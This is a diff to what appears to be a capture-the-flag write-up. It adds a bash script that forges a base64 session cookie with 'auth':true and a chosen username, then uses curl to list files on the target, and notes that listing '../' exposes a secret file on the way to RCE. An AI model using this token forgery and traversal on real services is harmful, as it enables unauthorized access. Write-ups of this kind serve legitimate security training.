@@ -110,6 +110,22 @@ Cookie: token=<@burp_urlencode><@base64>{"data":"<@base64>{"id":2,"username":"..
 
 Interestingly enough we have a way to list directories.
 
+If you want to play around an alternative way is using a simple bash script:
+
+```bash
+#!/bin/sh
+
+
+inside='{"id":2,"username":"'$2'"}'
+inside=$(/bin/echo -n $inside | base64)
+token=$(/bin/echo -n '{"auth":true,"data":"'$inside'"}' |base64)
+
+
+echo $token
+curl $1/account/files -H "Cookie: token=$token" | jq
+curl $1/account/files -H "Cookie: token=$token" | jq  -r '.files[] |.link'
+```
+
 For flag number 2 it's enough to list `../` to find a secret file.
 
 But now what? Remember that at this point we have three things that we have to put together to reach a much better result (RCE in the end):
